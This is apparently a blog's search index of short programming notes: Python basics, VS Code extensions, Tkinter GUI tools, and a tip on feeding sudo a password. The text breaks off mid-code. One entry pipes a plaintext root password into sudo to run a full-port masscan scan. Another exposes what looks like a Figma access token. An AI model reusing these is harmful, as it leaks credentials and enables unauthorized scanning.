<?xml version="1.0" encoding="utf-8"?>
<search>
  
  
  
  <entry>
    <title>Test local image</title>
    <link href="/2023/03/23/Test/test-local-image/"/>
    <url>/2023/03/23/Test/test-local-image/</url>
    
    <content type="html"><![CDATA[<h1 id="Test-local-image"><a href="#Test-local-image" class="headerlink" title="Test local image"></a>Test local image</h1><p><img src="/2023/03/23/Test/test-local-image/image-20230323112709634.png" alt="image-20230323112709634"></p>]]></content>
    
    
    <categories>
      
      <category>Test</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Test</tag>
      
      <tag>Image</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Python</title>
    <link href="/2023/03/18/Code/Python/Python/"/>
    <url>/2023/03/18/Code/Python/Python/</url>
    
    <content type="html"><![CDATA[<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-meta">&gt;&gt;&gt; </span>a = &#123;&#125;<br><span class="hljs-meta">&gt;&gt;&gt; </span>b = &#123;&#125;<br>&gt;&gt;&gt;<br><span class="hljs-meta">&gt;&gt;&gt; </span>a[<span class="hljs-number">1</span>] = <span class="hljs-number">2</span><br><span class="hljs-meta">&gt;&gt;&gt; </span>a<br>&#123;<span class="hljs-number">1</span>: <span class="hljs-number">2</span>&#125;<br>&gt;&gt;&gt;<br><span class="hljs-meta">&gt;&gt;&gt; </span>b[<span class="hljs-string">&quot;a&quot;</span>] = a<br><span class="hljs-meta">&gt;&gt;&gt; </span>b<br>&#123;<span class="hljs-string">&#x27;a&#x27;</span>: &#123;<span class="hljs-number">1</span>: <span class="hljs-number">2</span>&#125;&#125;<br>&gt;&gt;&gt;<br><span class="hljs-meta">&gt;&gt;&gt; </span>a[<span class="hljs-number">1</span>] = <span class="hljs-number">3</span><br><span class="hljs-meta">&gt;&gt;&gt; </span>b<br>&#123;<span class="hljs-string">&#x27;a&#x27;</span>: &#123;<span class="hljs-number">1</span>: <span class="hljs-number">3</span>&#125;&#125;<br>&gt;&gt;&gt;<br><span class="hljs-meta">&gt;&gt;&gt; </span>a = &#123;<span class="hljs-number">1</span>:<span class="hljs-number">2</span>&#125;<br><span class="hljs-meta">&gt;&gt;&gt; </span>b<br>&#123;<span class="hljs-string">&#x27;a&#x27;</span>: &#123;<span class="hljs-number">1</span>: <span class="hljs-number">3</span>&#125;&#125;<br><span class="hljs-meta">&gt;&gt;&gt; </span><br></code></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">run</span>():</span><br>    udict = &#123;&#125;<br>    temp = &#123;&#125;<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">5</span>):<br>        count = i+<span class="hljs-number">1</span><br>        temp[<span class="hljs-string">&quot;a&quot;</span>] = count<br>        udict[i] = temp<br>    <span class="hljs-built_in">print</span>(udict)<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">run_1</span>():</span><br>    udict = &#123;&#125;<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">5</span>):<br>        count = i+<span class="hljs-number">1</span><br>        temp = &#123;&#125;<br>        temp[<span class="hljs-string">&quot;a&quot;</span>] = count<br>        udict[i] = temp<br>    <span class="hljs-built_in">print</span>(udict)<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">run_2</span>():</span><br>    udict = &#123;&#125;<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">5</span>):<br>        count = i+<span class="hljs-number">1</span><br>        temp = &#123;<span class="hljs-string">&quot;a&quot;</span>:count&#125;<br>        udict[i] = temp<br>    <span class="hljs-built_in">print</span>(udict)<br><br>run()<br>run_1()<br>run_2()<br><br><span class="hljs-comment"># &#123;0: &#123;&#x27;a&#x27;: 5&#125;, 1: &#123;&#x27;a&#x27;: 5&#125;, 2: &#123;&#x27;a&#x27;: 5&#125;, 3: &#123;&#x27;a&#x27;: 5&#125;, 4: &#123;&#x27;a&#x27;: 5&#125;&#125;</span><br><span class="hljs-comment"># &#123;0: &#123;&#x27;a&#x27;: 1&#125;, 1: &#123;&#x27;a&#x27;: 2&#125;, 2: &#123;&#x27;a&#x27;: 3&#125;, 3: &#123;&#x27;a&#x27;: 4&#125;, 4: &#123;&#x27;a&#x27;: 5&#125;&#125;</span><br><span class="hljs-comment"># &#123;0: &#123;&#x27;a&#x27;: 1&#125;, 1: &#123;&#x27;a&#x27;: 2&#125;, 2: &#123;&#x27;a&#x27;: 3&#125;, 3: &#123;&#x27;a&#x27;: 4&#125;, 4: &#123;&#x27;a&#x27;: 5&#125;&#125;</span><br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>Python</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Python</tag>
      
      <tag>Code</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>sudoå¯†ç ç›´æ¥æ·»åŠ åˆ°å‘½ä»¤è¡Œä»¥æ–¹ä¾¿å®ç°è„šæœ¬è‡ªåŠ¨åŒ–</title>
    <link href="/2023/03/16/Linux/sudo%E5%AF%86%E7%A0%81%E7%9B%B4%E6%8E%A5%E6%B7%BB%E5%8A%A0%E5%88%B0%E5%91%BD%E4%BB%A4%E8%A1%8C%E4%BB%A5%E6%96%B9%E4%BE%BF%E5%AE%9E%E7%8E%B0%E8%84%9A%E6%9C%AC%E8%87%AA%E5%8A%A8%E5%8C%96/"/>
    <url>/2023/03/16/Linux/sudo%E5%AF%86%E7%A0%81%E7%9B%B4%E6%8E%A5%E6%B7%BB%E5%8A%A0%E5%88%B0%E5%91%BD%E4%BB%A4%E8%A1%8C%E4%BB%A5%E6%96%B9%E4%BE%BF%E5%AE%9E%E7%8E%B0%E8%84%9A%E6%9C%AC%E8%87%AA%E5%8A%A8%E5%8C%96/</url>
    
    <content type="html"><![CDATA[<h1 id="sudoå¯†ç ç›´æ¥æ·»åŠ åˆ°å‘½ä»¤è¡Œä»¥æ–¹ä¾¿å®ç°è„šæœ¬è‡ªåŠ¨åŒ–"><a href="#sudoå¯†ç ç›´æ¥æ·»åŠ åˆ°å‘½ä»¤è¡Œä»¥æ–¹ä¾¿å®ç°è„šæœ¬è‡ªåŠ¨åŒ–" class="headerlink" title="sudoå¯†ç ç›´æ¥æ·»åŠ åˆ°å‘½ä»¤è¡Œä»¥æ–¹ä¾¿å®ç°è„šæœ¬è‡ªåŠ¨åŒ–"></a>sudoå¯†ç ç›´æ¥æ·»åŠ åˆ°å‘½ä»¤è¡Œä»¥æ–¹ä¾¿å®ç°è„šæœ¬è‡ªåŠ¨åŒ–</h1><blockquote><p>åŸæ–‡é“¾æ¥ï¼š<a href="https://www.cnblogs.com/gaowengang/p/13947190.html">https://www.cnblogs.com/gaowengang/p/13947190.html</a></p></blockquote><p>æ–¹æ³•1ï¼šä½¿ç”¨ç®¡é“ä¼ é€’å¯†ç ã€‚</p><p>æ¯”å¦‚ root å¯†ç ä¸º kaliï¼Œè¦æ‰§è¡Œå‘½ä»¤ masscanï¼Œåˆ™ç”¨æ³•å¦‚ä¸‹ï¼Œ</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">$</span><span class="bash"> <span class="hljs-built_in">echo</span> kali | sudo -S masscan ip -p0-65535 --rate 100000 -oL ip.txt</span><br></code></pre></td></tr></table></figure><p>å…¶ä¸­ -S å‚æ•°è¡¨ç¤ºï¼š read the password from the standard input instead of using the terminal device. The password must be followed by a newline character.</p><p>æ–¹æ³•2ï¼šä½¿ç”¨æ–‡æœ¬é‡å®šå‘ã€‚</p><p>æ¯”å¦‚ root å¯†ç ä¸º kaliï¼Œè¦æ‰§è¡Œå‘½ä»¤ masscanï¼Œåˆ™ç”¨æ³•å¦‚ä¸‹ (shell è„šæœ¬ä¸­)ï¼Œ</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs shell">sudo masscan ip -p0-65535 --rate 100000 -oL ip.txt &lt;&lt; END   <br><span class="hljs-meta">#</span><span class="bash"> åç»­çš„è¾“å…¥ä½œä¸ºå­å‘½ä»¤æˆ–å­ shell çš„è¾“å…¥ï¼Œç›´åˆ°é‡åˆ° ENDï¼ˆè¿™é‡Œçš„ END å¯ä»¥è‡ªå®šä¹‰ï¼Œæ¯”å¦‚ OKï¼Œ EOFï¼Œç­‰éƒ½å¯ä»¥ï¼‰</span><br>kali<br>END<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>Linux</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Linux</tag>
      
      <tag>sudo</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Pythonæ‰©å±•-VScode</title>
    <link href="/2023/02/13/Code/Python/Python%E6%89%A9%E5%B1%95-VScode/"/>
    <url>/2023/02/13/Code/Python/Python%E6%89%A9%E5%B1%95-VScode/</url>
    
    <content type="html"><![CDATA[<h1 id="Pythonæ‰©å±•-VScode"><a href="#Pythonæ‰©å±•-VScode" class="headerlink" title="Pythonæ‰©å±•-VScode"></a>Pythonæ‰©å±•-VScode</h1><h2 id="0x01-Python"><a href="#0x01-Python" class="headerlink" title="0x01 Python"></a>0x01 Python</h2><p><a href="https://cloud.tencent.com/developer/article/1786086">ç”¨ VS Code å†™ Pythonï¼Œè¿™å‡ ä¸ªæ’ä»¶æ˜¯å¿…è£…çš„ï¼ - è…¾è®¯äº‘å¼€å‘è€…ç¤¾åŒº-è…¾è®¯äº‘ (tencent.com)</a></p><h3 id="1ã€python"><a href="#1ã€python" class="headerlink" title="1ã€python"></a>1ã€python</h3><p>IntelliSense (Pylance), Linting, Debugging (multi-threaded, remote), Jupyter Notebooks, code formatting, refactoring, unit tests, and more.</p><h3 id="2ã€python-snippet"><a href="#2ã€python-snippet" class="headerlink" title="2ã€python snippet"></a>2ã€python snippet</h3><p>Code snippets for python</p><h3 id="3ã€arepl"><a href="#3ã€arepl" class="headerlink" title="3ã€arepl"></a>3ã€arepl</h3><p>real-time python scratchpadï¼ˆå®æ—¶è¿è¡Œï¼‰</p><h3 id="4ã€kite-copilot"><a href="#4ã€kite-copilot" class="headerlink" title="4ã€kite - copilot"></a>4ã€kite - copilot</h3><p><a href="http://www.5190m.top/note/2022/6/24/2022-06-24-code-with-kite.html">Kiteçš„å®‰è£…ä»¥åŠåœ¨Jupyterå’ŒVSCodeä¸­çš„ä½¿ç”¨ | è®°å½•æŠ€æœ¯ç¬”è®° (5190m.top)</a></p><h3 id="5ã€autodocstring-python-docstring-generator"><a href="#5ã€autodocstring-python-docstring-generator" class="headerlink" title="5ã€autodocstring - python docstring generator"></a>5ã€autodocstring - python docstring generator</h3><p>Generates python docstrings automaticallyï¼ˆæ–‡æ¡£è¯´æ˜ç¼–å†™ï¼‰</p><h3 id="6ã€python-test-explorer"><a href="#6ã€python-test-explorer" class="headerlink" title="6ã€python test explorer"></a>6ã€python test explorer</h3><p>Run your Python tests in the Sidebar of Visual Studio Codeï¼ˆæµ‹è¯•è¿è¡Œï¼‰</p><p>Pytestï¼šè®¾ç½®ä¸­å¯ç”¨ Python &gt; Testing: Pytest Enabled ç„¶åæ ¹æ®æç¤ºå®‰è£… or ç›´æ¥ pip å®‰è£…</p><h2 id="0x02-Others"><a href="#0x02-Others" class="headerlink" title="0x02 Others"></a>0x02 Others</h2><p><a href="https://www.gxlsystem.com/qianduan-2413377.html">2023å¹´æœ€æ–°æœ€å…¨çš„VScodeæ’ä»¶æ¨è (gxlsystem.com)</a></p><p><a href="https://zhuanlan.zhihu.com/p/265806538">è¶…å¼ºå¤§ï¼æ²¡æœ‰è¿™ 24 æ¬¾æ’ä»¶çš„ VScode æ˜¯æ²¡æœ‰çµé­‚çš„ï¼ - çŸ¥ä¹ (zhihu.com)</a></p><h3 id="1ã€vscode-json"><a href="#1ã€vscode-json" class="headerlink" title="1ã€vscode-json"></a>1ã€vscode-json</h3><p>Beautify/Uglify/Escape/Unescape JSONï¼ˆæ“ä½œç¾åŒ–jsonï¼‰</p><p>å¿«æ·é”®ï¼š</p><ul><li><code>cmd+alt+v</code>ï¼ŒéªŒè¯</li><li><code>cmd+alt+b</code>ï¼Œæ ¼å¼åŒ–</li><li><code>cmd+alt+u</code>ï¼Œå‹ç¼©</li><li><code>cmd+alt+&#39;</code>ï¼ŒåŠ è½¬ä¹‰å­—ç¬¦</li><li><code>cmd+alt+;</code>ï¼Œå»è½¬ä¹‰å­—ç¬¦</li></ul><h3 id="2ã€Regex-Previewer"><a href="#2ã€Regex-Previewer" class="headerlink" title="2ã€Regex Previewer"></a>2ã€Regex Previewer</h3><p>é¢„è§ˆæ­£åˆ™è¡¨è¾¾å¼æ•ˆæœ</p>]]></content>
    
    
    <categories>
      
      <category>Python</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Python</tag>
      
      <tag>VScode</tag>
      
      <tag>extension</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Python GUI</title>
    <link href="/2023/01/28/Code/Python/Python-GUI/"/>
    <url>/2023/01/28/Code/Python/Python-GUI/</url>
    
    <content type="html"><![CDATA[<h1 id="Python-GUI"><a href="#Python-GUI" class="headerlink" title="Python GUI"></a>Python GUI</h1><h2 id="0x01-Tkinter"><a href="#0x01-Tkinter" class="headerlink" title="0x01 Tkinter"></a>0x01 Tkinter</h2><p><strong>Tkinterï¼š</strong></p><ul><li>Tkinter æ˜¯ä¸€ä¸ªåŸºäº tcl çš„æ¡Œé¢åº”ç”¨ç¨‹åºå¼€å‘å·¥å…·ï¼ŒPython ä½¿ç”¨ Tkinter å¯ä»¥å¿«é€Ÿåˆ›å»º GUI åº”ç”¨ç¨‹åº</li><li><p>Tkinter æ˜¯ Python çš„æ ‡å‡† GUI åº“ï¼Œåˆç§° Tk æ¥å£ï¼Œæ˜¯ä¸€ä¸ªè½»é‡çº§çš„è·¨å¹³å°å›¾å½¢ç”¨æˆ·ç•Œé¢ï¼ˆGUIï¼‰å¼€å‘å·¥å…·</p></li><li><p>Tkinter æ˜¯ Tk å›¾å½¢ç”¨æˆ·ç•Œé¢å·¥å…·åŒ…æ ‡å‡†çš„ Python æ¥å£ï¼Œå¯ä»¥è¿è¡Œåœ¨å¤§å¤šæ•° Unixã€Windows å’Œ Mac OS ç³»ç»Ÿä¸­</p></li><li><p>Python çš„é»˜è®¤ IDLE å°±æ˜¯ä½¿ç”¨ Tkinter å¼€å‘çš„</p></li></ul><p><strong>ä½¿ç”¨æ•™ç¨‹ï¼š</strong></p><ul><li><p><a href="https://docs.python.org/zh-cn/3/library/tk.html">Tkå›¾å½¢ç”¨æˆ·ç•Œé¢(GUI) â€” Python 3.11.1 æ–‡æ¡£</a></p></li><li><p><a href="https://zhuanlan.zhihu.com/p/92017216">Pythonçš„æ ‡å‡†GUIåº“ï¼šTkinterå¼€å‘åŸºç¡€ - çŸ¥ä¹ (zhihu.com)</a></p></li><li><p><a href="https://blog.csdn.net/muzihuaner/article/details/106248343">ã€Pythonã€‘Tkinteræ•™ç¨‹_æœ¨å­æ¬¢å„¿çš„åšå®¢-CSDNåšå®¢</a></p></li><li><a href="https://www.cnblogs.com/shwee/p/9427975.html">Python GUIä¹‹tkinterçª—å£è§†çª—æ•™ç¨‹å¤§é›†åˆ - æ´ªå« - åšå®¢å›­ (cnblogs.com)</a></li><li><a href="https://www.runoob.com/python/python-gui-tkinter.html">Python GUI ç¼–ç¨‹(Tkinter) | èœé¸Ÿæ•™ç¨‹ (runoob.com)</a></li><li><a href="https://docs.python.org/zh-cn/3/library/tkinter.ttk.html#label-options">tkinter.ttk â€”- Tk é£æ ¼çš„æ§ä»¶ â€” Python 3.11.1 æ–‡æ¡£</a></li></ul><h3 id="1ã€Sun-Valley-ttk-theme"><a href="#1ã€Sun-Valley-ttk-theme" class="headerlink" title="1ã€Sun-Valley-ttk-theme"></a>1ã€Sun-Valley-ttk-theme</h3><blockquote><p>Tkinter é»˜è®¤çš„æ ·å¼æ˜¯æ¯”è¾ƒä¸‘çš„ï¼Œå¹¶ä¸”ä¸æ”¯æŒè‡ªå®šä¹‰æ ·å¼ã€‚ä¸ºäº†æ”¹å–„è¿™ç§å°è±¡ï¼Œå®˜æ–¹å°±æä¾›äº† ttk ç»„ä»¶ï¼Œæ˜¯å¯¹ tkinter çš„ä¸€ä¸ªæ‹“å±•ï¼Œå…è®¸å¯¹ tkinter é»˜è®¤çš„æ ·å¼è¿›è¡Œä¿®æ”¹ã€‚è€Œ Sun-Valley-ttk-theme æ˜¯ä½¿ç”¨äº† tcl ä¸ ttk åŸºç¡€ï¼Œåˆ›å»ºäº†ä¸€ä¸ªç±»ä¼¼ win 11 ç³»ç»Ÿé£æ ¼çš„ä¸»é¢˜æ ·å¼ã€‚å¹¶ä¸”åŸºäºç±»ä¼¼è¿™ä¸ªé¡¹ç›®çš„è¿˜æœ‰ Azure-ttk-theme ä¸ Forest-ttk-theme ã€‚ä¸€ä¸ªæ˜¯ win11 ç³»ç»Ÿé£æ ¼ï¼Œä¸€ä¸ªæ˜¯ç±»ä¼¼ Excel çš„ä¸»é¢˜ã€‚</p><p>åŸæ–‡é“¾æ¥ï¼š<a href="https://blog.csdn.net/fei347795790/article/details/123154170">https://blog.csdn.net/fei347795790/article/details/123154170</a></p></blockquote><p><strong>A gorgeous theme for ttk, based on Microsoftâ€™s Sun Valley visual styles âœ¨</strong></p><p><strong>Githubï¼š</strong><a href="https://github.com/rdbende/Sun-Valley-ttk-theme">rdbende/Sun-Valley-ttk-theme (github.com)</a></p><p><strong>Examplesï¼š</strong><a href="https://github.com/rdbende/Sun-Valley-ttk-examples">rdbende/Sun-Valley-ttk-examples: Example apps</a></p><p><strong>PyPIï¼š</strong><a href="https://pypi.org/project/sv-ttk/">sv-ttk Â· PyPI</a></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">$</span><span class="bash"> pip install sv-ttk</span><br></code></pre></td></tr></table></figure><h3 id="2ã€Visual-TK"><a href="#2ã€Visual-TK" class="headerlink" title="2ã€Visual TK"></a>2ã€Visual TK</h3><p><strong>Visual Python Tkinter GUI Creator</strong></p><p><strong>URLï¼š</strong><a href="https://visualtk.com/">Visual TK, Visual Python Tkinter GUI Creator</a></p><h3 id="3ã€Tkinter-Designer"><a href="#3ã€Tkinter-Designer" class="headerlink" title="3ã€Tkinter Designer"></a>3ã€Tkinter Designer</h3><p><strong>An easy and fast way to create a Python GUI ğŸ</strong> </p><p><strong>Githubï¼š</strong><a href="https://github.com/ParthJadhav/Tkinter-Designer">ParthJadhav/Tkinter-Designer:</a></p><p><strong>Figmaï¼š</strong><a href="https://www.figma.com/">Figma: the collaborative interface design tool.</a></p><blockquote><p>Figmaï¼šTest<br>figd_GwhP7_etvHhtskDMPDNA6PSYvPsrCEeEPa5Hm2Bq<br>Copy this token. This is your only chance to do so!</p></blockquote><h2 id="0x02-PyQt"><a href="#0x02-PyQt" class="headerlink" title="0x02 PyQt"></a>0x02 PyQt</h2><p>åŸæ–‡é“¾æ¥ï¼š<a href="https://blog.csdn.net/ungoing/article/details/127181855">https://blog.csdn.net/ungoing/article/details/127181855</a></p><h2 id="0x03-Kivy"><a href="#0x03-Kivy" class="headerlink" title="0x03 Kivy"></a>0x03 Kivy</h2><h2 id="0x04-wxPython"><a href="#0x04-wxPython" class="headerlink" title="0x04 wxPython"></a>0x04 wxPython</h2><h2 id="0x05-Flexx"><a href="#0x05-Flexx" class="headerlink" title="0x05 Flexx"></a>0x05 Flexx</h2><h2 id="0x06-PySide"><a href="#0x06-PySide" class="headerlink" title="0x06 PySide"></a>0x06 PySide</h2><h2 id="0x07-PyGTK"><a href="#0x07-PyGTK" class="headerlink" title="0x07 PyGTK"></a>0x07 PyGTK</h2>]]></content>
    
    
    <categories>
      
      <category>Python</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Python</tag>
      
      <tag>Code</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Python getting started</title>
    <link href="/2023/01/11/Code/Python/Python-getting-started/"/>
    <url>/2023/01/11/Code/Python/Python-getting-started/</url>
    
    <content type="html"><![CDATA[<h1 id="Python-getting-started"><a href="#Python-getting-started" class="headerlink" title="Python getting started"></a>Python getting started</h1><blockquote><p>å¾®è½¯å®˜æ–¹pythonæ•™ç¨‹</p><ul><li><p><a href="https://www.bilibili.com/video/BV1nE41127zQ">å¾®è½¯å®˜æ–¹ Python å…¥é—¨æ•™ç¨‹_bilibili</a></p></li><li><p><a href="https://www.bilibili.com/video/BV1WT4y137cD/">å¾®è½¯å®˜æ–¹ Python è¿›é˜¶æ•™ç¨‹_bilibili</a></p></li><li><p><a href="https://www.bilibili.com/video/BV1qa4y1Y7CD/">å¾®è½¯å®˜æ–¹ Python é«˜é˜¶æ•™ç¨‹_bilibili</a></p></li></ul><p>Githubä»“åº“</p><ul><li><a href="https://github.com/microsoft/c9-python-getting-started">GitHub - microsoft/c9-python-getting-started: Sample code for Channel 9 Python for Beginners course</a></li></ul></blockquote><h2 id="ä¸€ã€Python-for-beginners"><a href="#ä¸€ã€Python-for-beginners" class="headerlink" title="ä¸€ã€Python for beginners"></a>ä¸€ã€Python for beginners</h2><p><strong>What is Python?</strong></p><ul><li>Flexible programming language</li><li>Designed to be human readable</li></ul><blockquote><p>Python is an interpreted, high-level, general-purpose programming language. Created by Guido van Rossum and first released in 1991, Pythonâ€™s design philosophy emphasizes code readability with its notable use of significant whitespace. Its language constructs and object-oriented approach aims to help programmers write clear, logical code for small and large-scale projects.</p><p><a href="https://en.wikipedia.org/wiki/Python_(programming_language">https://en.wikipedia.org/wiki/Python_(programming_language</a>)</p></blockquote><p><strong>Why use Python?</strong></p><ul><li>Great starter language</li><li>Great advanced language</li><li>Wonderful community</li></ul><p><strong>What can I build with Python?</strong></p><ul><li>Machine learning models</li><li>Artificial intelligence projects</li><li>Web applications</li><li>Automation utilities</li><li>Anything, really</li></ul><h3 id="1ã€Print"><a href="#1ã€Print" class="headerlink" title="1ã€Print"></a>1ã€Print</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># print displays output to your console</span><br><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;Hello world&#x27;</span>)<br><br><span class="hljs-comment"># Enclose strings in single or double quotes</span><br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Hello world&quot;</span>)<br><br><span class="hljs-comment"># Getting information from the user</span><br>name = <span class="hljs-built_in">input</span>(<span class="hljs-string">&#x27;Please enter your name:&#x27;</span>)<br><span class="hljs-built_in">print</span>(name)<br><br><span class="hljs-comment"># Printing blank lines can improve readability</span><br><span class="hljs-built_in">print</span>()<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;Hello \nworld&#x27;</span>)<br><br><span class="hljs-comment"># Debugging with print</span><br><br></code></pre></td></tr></table></figure><h3 id="2ã€Comments"><a href="#2ã€Comments" class="headerlink" title="2ã€Comments"></a>2ã€Comments</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># We add comments to our code using #</span><br><span class="hljs-comment"># Lines that start with # are not executed</span><br><span class="hljs-comment"># Comment calls to other programs to explain their purpose</span><br><span class="hljs-comment"># Comments document your code so you and other programmers can understand the code</span><br><span class="hljs-comment"># Commenting lines of code can help you debug and figure out which line of code is causing an error</span><br><br><span class="hljs-comment"># This is a comment</span><br><span class="hljs-comment"># print(&#x27;Hello world&#x27;)</span><br><br></code></pre></td></tr></table></figure><h3 id="3ã€String"><a href="#3ã€String" class="headerlink" title="3ã€String"></a>3ã€String</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># Strings can be stored in variables</span><br><span class="hljs-comment"># You can combine strings with +</span><br>first_name = <span class="hljs-string">&#x27;John&#x27;</span><br>last_name = <span class="hljs-string">&#x27;Wong&#x27;</span><br><span class="hljs-built_in">print</span>(first_name)<br><span class="hljs-built_in">print</span>(last_name)<br><span class="hljs-built_in">print</span>(first_name + last_name)<br><br><span class="hljs-comment"># Getting information from the user</span><br>first_name = <span class="hljs-built_in">input</span>(<span class="hljs-string">&#x27;Please enter your first name:&#x27;</span>)<br>last_name = <span class="hljs-built_in">input</span>(<span class="hljs-string">&#x27;Please enter your last name:&#x27;</span>)<br><span class="hljs-built_in">print</span>(first_name + <span class="hljs-string">&#x27; &#x27;</span> + last_name)<br><span class="hljs-built_in">print</span>(first_name + <span class="hljs-string">&#x27; &#x27;</span> \<br>      + last_name)<br><br><span class="hljs-comment"># You can use functions to modify strings</span><br>sentence = <span class="hljs-string">&#x27;This is my dog&#x27;</span><br><span class="hljs-built_in">print</span>(sentence.upper())<br><span class="hljs-built_in">print</span>(sentence.lower())<br><span class="hljs-built_in">print</span>(sentence.capitalize())<br><span class="hljs-built_in">print</span>(sentence.count(<span class="hljs-string">&#x27;a&#x27;</span>))<br><br><span class="hljs-comment"># format strings</span><br>output = <span class="hljs-string">&#x27;Hello, &#x27;</span> + first_name + <span class="hljs-string">&#x27; &#x27;</span> + last_name<br>output = <span class="hljs-string">&#x27;Hello, &#123;&#125; &#123;&#125;&#x27;</span>.<span class="hljs-built_in">format</span>(first_name,last_name)<br>output = <span class="hljs-string">&#x27;Hello, &#123;0&#125; &#123;1&#125;&#x27;</span>.<span class="hljs-built_in">format</span>(first_name,last_name)<br>output = <span class="hljs-string">f&#x27;Hello, <span class="hljs-subst">&#123;first_name&#125;</span> <span class="hljs-subst">&#123;last_name&#125;</span>&#x27;</span><br><br></code></pre></td></tr></table></figure><h3 id="4ã€Numbers"><a href="#4ã€Numbers" class="headerlink" title="4ã€Numbers"></a>4ã€Numbers</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># Numbers can be stored in variables</span><br>pi = <span class="hljs-number">3.14</span><br><span class="hljs-built_in">print</span>(pi)<br><br><span class="hljs-comment"># You can do math with numbers </span><br>first_number = <span class="hljs-number">6</span><br>second_name = <span class="hljs-number">2</span><br><span class="hljs-built_in">print</span>(first_number + second_name)<br><span class="hljs-built_in">print</span>(first_number ** second_name)<br><br><span class="hljs-comment"># If you combine strings with numbers, Python gets confused</span><br><span 